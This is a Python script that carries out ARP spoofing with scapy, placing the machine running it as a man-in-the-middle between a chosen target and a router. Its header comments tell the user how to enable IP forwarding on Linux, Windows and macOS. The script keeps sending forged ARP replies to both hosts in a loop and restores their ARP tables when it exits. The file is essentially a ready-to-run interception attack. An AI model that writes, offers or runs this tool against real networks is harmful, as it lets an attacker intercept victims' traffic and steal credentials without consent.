# to run the program in linux, you need to activate the ip forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward
# to deactivate the ip forwarding
# echo 0 > /proc/sys/net/ipv4/ip_forward
# or echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward if you get permission denied error
# to see the ip forwarding status
# cat /proc/sys/net/ipv4/ip_forward
# ---------------------------------------------------------------------------------------------------------------------
# to run the program in windows, you need to enable the ip forwarding
# by running the following command in the command prompt
# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1
# to disable the ip forwarding
# reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 0
# to see the ip forwarding status
# reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter
# ---------------------------------------------------------------------------------------------------------------------
# to run the program in mac, you need to enable the ip forwarding
# by running the following command in the terminal
# sudo sysctl -w net.inet.ip.forwarding=1
# to disable the ip forwarding
# sudo sysctl -w net.inet.ip.forwarding=0
# to see the ip forwarding status
# sysctl -a | grep forward
import time
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-r", "--router", dest="router", help="Router IP address")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    elif not options.router:
        parser.error("[-] Please specify a router IP address, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast / arp_request
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] No response received for IP: {ip}")
        return None


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op1 is for request, op2 is for response
    # pdst is the target ip address
    # hwdst is the target mac address
    # psrc is the source ip address which I set to router ip address
    if target_mac is None:
        print(f"[-] Could not find MAC address for IP: {target_ip}. Skipping...")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp_table(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip,
                       hwsrc=get_mac(source_ip))
    # send the packet 4 times to make sure the destination machine gets the packet
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
victim = options.target
router = options.router
try:
    count = 0
    while True:
        spoof(router, victim)
        spoof(victim, router)
        count += 2
        # \r is used to print on the same line
        # dynamic printing
        print("\r[+] packets sent: " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore_arp_table(router, victim)
    restore_arp_table(victim, router)
    print("\n[+] Restored ARP table. Exiting...")
